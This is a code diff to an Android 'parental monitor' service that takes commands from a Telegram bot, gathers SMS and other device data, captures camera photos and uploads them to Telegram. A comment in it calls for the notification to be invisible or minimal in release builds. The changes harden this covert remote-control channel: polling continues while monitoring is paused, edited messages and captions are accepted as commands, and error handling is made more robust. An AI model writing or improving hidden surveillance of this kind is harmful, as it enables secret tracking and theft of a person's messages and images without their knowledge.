@@ -210,7 +210,8 @@ class MonitoringService : Service() {
         initialSyncJob?.cancel()
         idlePolls = 0
         refreshCreds()
-        
+        refreshLoopConfig()
+
         // In RELEASE mode, make notification invisible/minimal
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
             .setSmallIcon(R.drawable.ic_notification)
@@ -432,7 +433,14 @@ class MonitoringService : Service() {
         commandJob = serviceScope.launch {
             while (isActive && commandJob === coroutineContext[Job]) {
                 if (cachedMonitoringPaused) {
-                    touchHeartbeat(this@MonitoringService)
+                    try {
+                        pollTelegramCommands()
+                        touchHeartbeat(this@MonitoringService)
+                    } catch (e: kotlinx.coroutines.CancellationException) {
+                        throw e
+                    } catch (e: Exception) {
+                        android.util.Log.e("MonitoringService", "Error polling commands while paused: ${redactToken(e.message)}")
+                    }
                     delay(60_000)
                     continue
                 }
@@ -496,6 +504,8 @@ class MonitoringService : Service() {
 
         val response = try {
             TelegramClient.api.getUpdates(url)
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             return false
         }
@@ -528,9 +538,9 @@ class MonitoringService : Service() {
                 handleCallbackQuery(callback)
                 continue
             }
-            val message = update.message ?: continue
+            val message = update.message ?: update.editedMessage ?: continue
             if (message.chat.id.toString() != chatId) continue
-            val full = message.text?.trim() ?: continue
+            val full = (message.text ?: message.caption)?.trim() ?: continue
             val raw = full.substringBefore("@").lowercase()
             if (!raw.startsWith("/")) continue
             val input = if (raw == "/sms" || raw.startsWith("/sms ")) {
@@ -875,6 +885,10 @@ class MonitoringService : Service() {
             }
             "/flush" -> {
                 val queued = messageQueue.getQueueSize()
+                if (authBlocked()) {
+                    sendToTelegram("⚠️ Flush ditunda: kredensial bot ditolak (${preferencesManager.credentialError}). Perbaiki token di Setup.")
+                    return
+                }
                 val scheduled = MessageScheduler.scheduleMessageSend(this)
                 if (scheduled) {
                     sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
@@ -1340,6 +1354,8 @@ class MonitoringService : Service() {
             preferencesManager.initialSyncDone = true
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
         }
@@ -1365,6 +1381,8 @@ class MonitoringService : Service() {
                     preferencesManager.lastCallId = latest.id
                 }
             }
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error checking new data: ${redactToken(e.message)}")
         }
@@ -1754,7 +1772,7 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastCameraErrorNotice
-            if (last > 0 && now - last < 30 * 60_000L) return
+            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
             sendToTelegram("⚠️ Photo capture failed: $reason. " + cameraFailureHint(reason))
         } catch (e: Exception) {
@@ -1766,7 +1784,7 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastUploadErrorNotice
-            if (last > 0 && now - last < 30 * 60_000L) return
+            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
             sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
         } catch (e: Exception) {
@@ -2154,6 +2172,8 @@ class MonitoringService : Service() {
                 notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
             }
             return false
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram: ${redactToken(e.message)}")
             return false
